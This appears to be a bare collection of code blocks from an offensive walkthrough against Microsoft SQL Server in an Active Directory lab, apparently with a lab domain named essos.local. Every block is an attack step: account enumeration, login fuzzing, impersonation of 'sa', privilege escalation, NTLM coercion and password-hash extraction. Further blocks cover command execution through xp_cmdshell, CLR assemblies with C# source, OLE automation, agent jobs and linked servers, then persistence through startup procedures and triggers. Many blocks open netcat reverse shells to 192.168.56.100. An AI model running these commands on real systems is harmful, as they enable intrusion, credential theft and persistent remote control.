["```\ncrackmapexec mssql 192.168.56.22-23\n```", "```\nsetspn -T essos -Q MSSQL*/*\npython3 GetUserSPNs.py essos.local/khal.drogo:horse\nSQLRecon.exe /e:SqlSpns\n```", "```\ncrackmapexec mssql 192.168.56.23 -u userfile -p passwordfile --no-bruteforce\n```", "```\nGet-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Get-SQLServerInfo\n```", "```\nGet-SQLFuzzServerLogin -Instance BRAAVOS\\SQLEXPRESS -Verbose\n```", "```\nGet-SQLFuzzDomainAccount -Instance BRAAVOS\\SQLEXPRESS -EndId 2000\n```", "```\n-- database version\nSELECT @@version;\n-- current login name\nSELECT SYSTEM_USER;\n-- current role\nSELECT USER;\n-- check if our role has public or sysadmin privileges\nSELECT IS_SRVROLEMEMBER('public');\nSELECT IS_SRVROLEMEMBER('sysadmin');\n-- list all databases\nSELECT name FROM master..sysdatabases;\n-- list all users\nSELECT * FROM sys.server_principals\n-- list linked servers\nEXEC sp_linkedservers;\n-- list logins available for impersonation\nSELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';\n-- effective permissions for the server and the database\nSELECT * FROM fn_my_permissions(NULL, 'SERVER')\nSELECT * FROM fn_my_permissions(NULL, 'DATABASE')\n```", "```\nEXECUTE AS LOGIN = 'sa'\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\n```", "```\nInvoke-SQLAuditPrivImpersonateLogin -Instance BRAAVOS\\SQLEXPRESS -Exploit\n```", "```\nCREATE DATABASE MyDb\nUSE MyDb\nALTER DATABASE MyDb SET TRUSTWORTHY ON\nCREATE LOGIN [ESSOS\\viserys.targaryen] FROM WINDOWS\nALTER LOGIN [ESSOS\\viserys.targaryen] with default_database = [MyDb];\nCREATE USER [ESSOS\\viserys.targaryen] FROM LOGIN [ESSOS\\viserys.targaryen];\nEXEC sp_addrolemember [db_owner], [ESSOS\\viserys.targaryen]\n```", "```\nSELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases;\n```", "```\nUSE MyDb;\nSELECT DP1.name AS DatabaseRoleName, isnull (DP2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM  RIGHT OUTER JOIN sys.database_principals AS DP1  ON DRM.role_principal_id = DP1.principal_id  LEFT OUTER JOIN sys.database_principals AS DP2  ON DRM.member_principal_id = DP2.principal_id  WHERE DP1.type = 'R' ORDER BY DP1.name;\n```", "```\nCREATE PROCEDURE sp_pe_trust\nWITH EXECUTE AS OWNER\nAS\nEXEC sp_addsrvrolemember [ESSOS\\viserys.targaryen],[sysadmin]\nEXEC sp_pe_trust\nSELECT is_srvrolemember('sysadmin')\n```", "```\nEXEC master.dbo.xp_dirtree '\\\\192.168.56.100\\blah'\n```", "```\nEXEC master..xp_cmdshell 'cmd.exe /c C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443'\n```", "```\nInvoke-SQLImpersonateService -Verbose -Instance BRAAVOS\\SQLEXPRESS\nGet-SQLServerPasswordHash -Verbose -Instance BRAAVOS\\SQLEXPRESS\n```", "```\nRawCopy64.exe /FileNamePath:\"C:\\Program Files\\Microsoft SQL Server\\MSSQL15.SQLEXPRESS\\MSSQL\\DATA\\master.mdf\" /OutputPath:C:\\Users\\Public\n[Reflection.Assembly]::LoadFile(\"$pwd\\OrcaMDF.RawCore.dll\")\n[Reflection.Assembly]::LoadFile(\"$pwd\\OrcaMDF.Framework.dll\")\nipmo .\\Get-MDFHashes.ps1\nGet-MDFHashes -mdf \"C:\\Users\\Public\\master.mdf\" | fl\n```", "```\nsp_addextendedproc 'xp_cmdshell','xplog70.dll\nEXEC sp_configure 'show advanced options',1\nRECONFIGURE\nEXEC sp_configure 'xp_cmdshell',1\nRECONFIGURE\nEXEC master..xp_cmdshell 'whoami'\n```", "```\nCreate-SQLFileXpDll -OutFile C:\\Users\\Public\\xp_shell.dll -Command \"C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443\" -ExportName xp_shell -Verbose\nGet-SQLQuery -Instance BRAAVOS\\SQLEXPRESS -Username sa -Password \"sa_P@ssw0rd!Ess0s\" -Query \"sp_addextendedproc 'xp_shell', 'C:\\Users\\Public\\xp_shell.dll'\"\nGet-SQLStoredProcedureXP -Instance BRAAVOS\\SQLEXPRESS -Username sa -Password \"sa_P@ssw0rd!Ess0s\"\nGet-SQLQuery -Instance BRAAVOS\\SQLEXPRESS -Username sa -Password \"sa_P@ssw0rd!Ess0s\" -Query \"EXEC xp_shell\"\n```", "```\nuse msdb\nEXEC sp_configure 'show advanced options',1\nRECONFIGURE\nEXEC sp_configure 'clr enabled',1\nRECONFIGURE\nCREATE ASSEMBLY my_evil FROM 'C:\\Users\\Public\\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE;\nCREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_evil].[StoredProcedures].[cmd_exec];\n```", "```\nSQLRecon.exe /auth:Local /host:braavos.essos.local /username:sa /password:\"sa_P@ssw0rd!Ess0s\" /module:EnableClr\n```", "```\nCreate-SQLFileCLRDll -OutFile runcmd -OutDir . -AssemblyName \"runcmd\" -AssemblyClassName \"StoredProcedures\" -AssemblyMethodName \"cmd_exec\"\n```", "```\n            using System;\n            using System.Data;\n            using System.Data.SqlClient;\n            using System.Data.SqlTypes;\n            using Microsoft.SqlServer.Server;\n            using System.Diagnostics;\n            public partial class StoredProcedures\n            {\n            [Microsoft.SqlServer.Server.SqlProcedure]\n            public static void cmd_exec ()\n            {\n            Process proc = new Process();\n            proc.StartInfo.FileName = @\"C:\\Windows\\System32\\cmd.exe\";\n               proc.StartInfo.Arguments = string.Format(@\" /C C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443\");\n            proc.Start();\n            proc.WaitForExit();\n            proc.Close();\n            }\n            };\n```", "```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library C:\\Users\\Public\\runcmd.csc\nSQLRecon.exe /auth:Local /host:braavos.essos.local /username:sa /password:\"sa_P@ssw0rd!Ess0s\" /module:Clr /dll:runcmd.dll /function:cmd_exec\n```", "```\nSQLRecon.exe /auth:Local /host:braavos.essos.local /username:sa /password:\"sa_P@ssw0rd!Ess0s\" /module:enableole\nSQLRecon.exe /auth:Local /host:braavos.essos.local /username:sa /password:\"sa_P@ssw0rd!Ess0s\" /module:olecmd /command:\"C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443\"\n```", "```\nDECLARE @output INT\nDECLARE @ProgramToRun VARCHAR(255)\nSET @ProgramToRun = 'Run(\"cmd.exe /c C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443\")'\nEXEC sp_oacreate 'wScript.Shell', @output out\nEXEC sp_oamethod @output, @ProgramToRun\nEXEC sp_oadestroy @output\n```", "```\nEXEC sp_configure 'show advanced options', 1\nRECONFIGURE\nEXEC SP_CONFIGURE 'Agent XPs', 1\nRECONFIGURE\nUSE msdb\nEXEC dbo.sp_add_job @job_name = N'rev_shell'\nEXEC sp_add_jobstep @job_name = N'rev_shell', @step_name = N'run_nc',\n@subsystem = N'cmdexec', @command = N'C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443', @retry_attempts = 1, @retry_interval = 5\nEXEC dbo.sp_add_jobserver @job_name = N'rev_shell'\nEXEC dbo.sp_start_job N'rev_shell'\nEXEC dbo.sp_delete_job @job_name = N'rev_shell'\n```", "```\nSELECT\njob.job_id, notify_level_email, name, enabled,\ndescription, step_name, command, server, database_name\nFROM\nmsdb.dbo.sysjobs job\nINNER JOIN\nmsdb.dbo.sysjobsteps steps\nON\njob.job_id = steps.job_id\n```", "```\nSQLRecon.exe /a:WinToken /h:castelblack /m:whoami\nSQLRecon.exe /a:WinToken /h:castelblack /m:links\nSQLRecon.exe /a:WinToken /h:castelblack /l:braavos /m:lwhoami\nSQLRecon.exe /a:WinToken /h:castelblack /l:braavos /m:lcheckrpc\nSQLRecon.exe /a:WinToken /h:castelblack /l:braavos /m:lenablexp\nSQLRecon.exe /a:WinToken /h:castelblack /l:braavos /m:lxpcmd /c:\"C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443\"\n```", "```\nEXEC master.dbo.sp_addlinkedserver @server = N'ENUM',\n@srvproduct=N'Active Directory Service Interfaces',\n@provider=N'ADSDSOObject', @datasrc=N'adsdatasource';\nEXEC master.dbo.sp_addlinkedsrvlogin @rmtsrvname = N'ENUM',\n@locallogin = NULL , @useself = N'True';\n(SELECT * FROM OPENQUERY(DEMO, 'SELECT sAMAccountName,\nuserAccountControl FROM ''LDAP://north.sevenkingdoms.local/DC=north,DC=sevenkingdoms,DC=local''\nWHERE objectCategory = ''Person'' AND objectClass = ''user'''))\n```", "```\nDECLARE @OLE INT\nDECLARE @FileID INT\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\nEXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rev.bat', 2, 1\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, 'C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443'\nEXECUTE sp_OADestroy @FileID\nEXECUTE sp_OADestroy @OLE\n```", "```\nUSE master\nCREATE PROCEDURE sp_rev_shell\nAS\nEXEC master..xp_cmdshell 'C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443'\nEXEC sp_procoption @ProcName = 'sp_rev_shell', @OptionName = 'startup', @OptionValue = 'on';\nSELECT * FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1;\n```", "```\nInvoke-SqlServer-Persist-StartupSp -SqlServerInstance BRAAVOS\\SQLEXPRESS -NewSqlUser evil -NewSqlPass evil123! -Verbose\n```", "```\nCREATE TRIGGER [ddl_persist]\nON DATABASE\nFOR DROP_TABLE\nAS\nEXEC master..xp_cmdshell 'C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443'\n```", "```\nCREATE TRIGGER [dml_persist]\nON new.dbo.player\nFOR INSERT, UPDATE, DELETE\nAS\nEXECUTE AS LOGIN = 'sa'\nEXEC master..xp_cmdshell 'C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443'\n```", "```\nCREATE LOGIN [fake] WITH PASSWORD = 'fake123!'\nCREATE TRIGGER [logon_persist]\nON ALL SERVER WITH EXECUTE AS 'sa'\nFOR LOGON\nAS\nBEGIN\nIF ORIGINAL_LOGIN() = 'fake'\n    EXEC master..xp_cmdshell 'C:\\Users\\Public\\nc.exe -e cmd 192.168.56.100 443'\nEND\n```"]